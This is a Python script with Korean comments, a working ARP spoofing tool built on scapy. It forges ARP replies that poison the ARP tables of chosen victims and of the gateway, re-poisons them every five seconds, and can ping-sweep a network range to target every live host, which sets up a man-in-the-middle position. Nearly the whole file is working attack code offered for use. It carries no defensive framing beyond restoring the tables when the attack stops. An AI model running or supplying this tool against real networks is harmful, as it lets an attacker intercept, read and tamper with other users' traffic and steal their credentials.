# ARP Spoofing Program
# Update : 2023-12-10
# Python Ver : 3.12.0
VERSION = "1.0.0"

DEBUG = True

# Import Library
from scapy.all import * #enables the user to send, sniff, dissect and forge network packets
from scapy.layers.l2 import Ether, ARP #Classes and functions for layer 2 protocols.
from time import sleep
import sys
import uuid # 내 MAC 주소를 얻기 위해 사용
import socket, subprocess, ipaddress # 네트워크 스캔을 위해 사용

# ARP Packet Operation Code
ARP_REQUEST = 1
ARP_REPLY = 2

# Broadcast Address
BROADCAST_MAC = 'ff:ff:ff:ff:ff:ff'

def getMAC(target_ip:str) -> str | None:
    '''IP 주소를 입력받아 MAC 주소를 리턴한다.'''
    if DEBUG: print(f"getMAC({target_ip})")
    
    # target_ip의 MAC 주소를 알아내기 위해 ARP 패킷을 broadcast로 전송
    # 타임아웃 5초, 재시도 3번
    # 리턴값 : (송신패킷, 수신패킷)리스트, 송신패킷 리스트
    send_recieve_packet_list, send_packet_list = srp(Ether(dst=BROADCAST_MAC)/ARP(pdst=target_ip), timeout=5, retry=3)
    
    # 수신된 패킷에서 MAC 주소를 리턴
    for sent_packet, received_packet in send_recieve_packet_list:
        # 찾았으면 MAC 주소 리턴, 못찾았으면 None 리턴
        if DEBUG: print(f"return {received_packet.sprintf('%Ether.src%')}")
        return received_packet.sprintf('%Ether.src%')
    
    
def poisonARP(fake_sender_ip:str, target_ip:str, target_mac:str) -> None:
    '''ARP Spoofing을 위한 ARP 패킷을 전송한다.'''
    if DEBUG: print(f"poisonARP({fake_sender_ip}, {target_ip}, {target_mac})")
    
    # Spoofing ARP 패킷을 생성
    arp=ARP(op=ARP_REPLY, psrc=fake_sender_ip, pdst=target_ip, hwdst=target_mac)
    # ARP 패킷을 전송
    send(arp)
    

def restoreARP(target_ip:str, target_mac:str, gateway_ip:str, gateway_mac:str) -> None:
    '''ARP Spoofing을 해제하기 위해 ARP 패킷을 전송한다.'''
    if DEBUG: print(f"restoreARP({target_ip}, {target_mac}, {gateway_ip}, {gateway_mac})")
    
    # 희생자 컴퓨터의 ARP테이블을 복구하는 ARP 패킷 (게이트웨이에서 보낸 것 처럼 위조)
    target_restore_arp=ARP(op=ARP_REPLY, psrc=gateway_ip, pdst=target_ip,  hwdst=BROADCAST_MAC, hwsrc=gateway_mac)
    # 게이트웨이의 ARP테이블을 복구하는 ARP 패킷 (희생자에서 보낸 것 처럼 위조)
    gateway_restore_arp=ARP(op=ARP_REPLY, psrc=target_ip, pdst=gateway_ip, hwdst=BROADCAST_MAC, hwsrc=target_mac)
    
    # ARP 패킷 누락을 방지하기 위해 3번 전송
    send(gateway_restore_arp, count=3)
    send(target_restore_arp, count=3)

def scan_network(ip_range, timeout=1, my_ip=None):
    '''주어진 IP 범위에서 호스트 스캔'''
    
    print(f"Scanning network [{ip_range}] for live hosts...")
    live_hosts = []

    for ip in ipaddress.IPv4Network(ip_range, strict=False):
        ip_str = str(ip)
        result = subprocess.call(['ping', '-n', '1', '-w', str(timeout), ip_str], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        if result == 0:
            if my_ip != None and ip_str in my_ip:
                print(f"Host {ip_str} is UP, but it's my IP, skipping.")
                continue
            print(f"Host {ip_str} is UP, adding to target.")
            live_hosts.append(ip_str)

    return live_hosts


def get_all_ip_addresses():
    '''호스트 이름과 IP 주소를 가져오기'''
    hostname = socket.gethostname()
    ip_addresses = socket.gethostbyname_ex(hostname)[2]

    return ip_addresses

# main
def main(*args, **kwargs) -> int:
    argc = kwargs.get("argc", 0) - 1
    argv = kwargs.get("argv", None)
    
    
    # 내 IP와 MAC 주소
    own_ip = get_all_ip_addresses()
    own_mac = ":".join([uuid.UUID(int=uuid.getnode()).hex[-12:][i:i+2] for i in range(0, 12, 2)])
    
    if DEBUG : print(f"own_ip: {own_ip}")
    if DEBUG : print(f"own_mac: {own_mac}")
    
    
    if argc >= 2 and not ("--multiple" in argv or "-m" in argv):
        target_ip = argv[2] # 희생자 IP
        
        target_ips = [] # 희생자 IP 리스트
        for ip in argv[2:]:
            if DEBUG: print(f"target_ip: {ip}")
            target_ips.append(ip)
        
    elif argc == 3 and (argv[1] == "--network" or argv[1] == "-n"):
        network_cidr = argv[3]
        
        target_ips = scan_network(network_cidr, my_ip = own_ip)
        if len(target_ips) == 0:
            print(f"Network CIDR [{network_cidr}]에 호스트가 없습니다.")
            return -1
    
    else:
        print(f"ARP Spoofing Program {VERSION}\n")
        print(f"usage: {argv[0]} [options] [<args>]\n")
        print("Options:")
        print("   <gateway ip> <target ip 1> [<target ip 2> ..]   ARP Spoofing")
        print("   -n --network <gateway ip> <network CIDR>        ARP Spoofing for all network targets")
        print("   -h --help                                       Show this help message and exit")
        return 0
    
    
    # 게이트웨이 IP
    gateway_ip = argv[1] 
    
    # MAC주소 찾기
    gateway_mac = getMAC(gateway_ip)
    target_macs = []
    for ip in target_ips:
        target_macs.append(getMAC(ip))
    
    # MAC 주소를 찾을 수 없으면 종료
    if gateway_mac == None: 
        print('Gateway MAC 주소를 찾을 수 없습니다')
        return -1
    for mac in target_macs:
        if mac == None:
            print('Target MAC 주소를 찾을 수 없습니다')
            return -1

    
    # ARP Spoofing 시작
    for target_ip, target_mac in zip(target_ips, target_macs):
        print(f"ARP Spoofing 시작 -> VICTIM IP [{target_ip}]")
        print(f"[{target_ip}]: POISON ARP Table [{gateway_mac}] -> [{own_mac}]")
        poisonARP(gateway_ip, target_ip, target_mac)
        poisonARP(target_ip, gateway_ip, gateway_mac)
        
    try: # KeyboardInterrupt 발생 전까지 5초마다 ARP Spoofing을 계속한다.
        while True:
            for target_ip, target_mac in zip(target_ips, target_macs):
                poisonARP(gateway_ip, target_ip, target_mac)
                poisonARP(target_ip, gateway_ip, gateway_mac)
                sleep(5)
    except KeyboardInterrupt:
        for target_ip, target_mac in zip(target_ips, target_macs):
            restoreARP(target_ip, target_mac, gateway_ip, gateway_mac)
            print(f"[{target_ip}]: RESTORE ARP Table [{own_mac}] -> [{gateway_mac}]")
            
    print("ARP Spoofing 종료 완료")
    return 0


if __name__ == "__main__":
    sys.exit(main(argc=len(sys.argv), argv=sys.argv))